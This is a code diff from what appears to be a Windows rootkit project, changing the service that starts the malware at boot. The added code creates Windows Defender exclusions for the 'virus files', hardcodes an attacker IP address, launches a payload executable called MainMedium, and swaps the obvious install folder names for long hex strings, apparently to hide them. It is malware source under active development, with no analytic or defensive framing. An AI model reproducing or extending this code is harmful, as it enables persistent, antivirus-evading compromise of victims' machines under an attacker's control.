@@ -20,13 +20,32 @@ DWORD WINAPI ServiceMainThread(LPVOID lpParam) {
     const char* CleaningCommands =
         "cd \"%ProgramFiles%\\Windows Defender\" && "
         "MpCmdRun.exe -Restore -All";
-    const char* AttackAddresses = "172.17.80.1~192.168.1.32~192.168.56.1~192.168.192.1~192.168.88.1";
+    //const char* AttackAddresses = "172.17.80.1~192.168.1.32~192.168.56.1~192.168.192.1~192.168.88.1";
+    const char* AttackerAddresses = "192.168.40.1";
+
+
+    // Create exclusion for virus files:
+    LastError = ExcludeRootkitFiles();
+    if (LastError != 0) {
+        return -1;
+    }
+
+
+    /*
+    // Get the possible IP addresses for the attacker (in this case - all default gateways):
+    char* AttackerAddresses = GetGatewayList();
+    if (AttackerAddresses == NULL) {
+        return -1;
+    }
+    */
 
 
     // Get IP addresses of target and attacker:
-    if (!MatchIpAddresses(TargetIp, AttackerIp, AttackAddresses)) {
+    if (!MatchIpAddresses(TargetIp, AttackerIp, AttackerAddresses)) {
+        //free(AttackerAddresses);
         return -1;
     }
+    //free(AttackerAddresses);
 
 
     // Make sure that all depended-on files exist on target machine (folders + files):
@@ -50,7 +69,9 @@ DWORD WINAPI ServiceMainThread(LPVOID lpParam) {
 
 
     // Activate medium:
-    HINSTANCE MediumProcess = ShellExecuteA(NULL, "open", "C:\\nosusfolder\\verysus\\MainMedium\\x64\\Release\\MainMedium.exe", NULL, NULL, SW_NORMAL);
+    HINSTANCE MediumProcess = ShellExecuteA(NULL, "open",
+        "C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097"
+        "\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\MainMedium\\x64\\Release\\MainMedium.exe", NULL, NULL, SW_NORMAL);
     if ((INT_PTR)MediumProcess <= 32) {
         return (DWORD)MediumProcess;
     }
@@ -145,7 +166,7 @@ VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv)
 int main(int argc, TCHAR* argv[]) {
     WCHAR WideAutoName[] = L"RootAuto";
     AutomaticService.InitiateService(WideAutoName);
-    AutomaticService.ServiceFile = "C:\\nosusfolder\\verysus\\AutoService\\AutoStart.exe";
+    AutomaticService.ServiceFile = "C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\AutoService\\AutoStart.exe";
 
     // Define the service table entry of the auto service (name, entrypoint ..) -
     SERVICE_TABLE_ENTRY ServiceTable[] = {
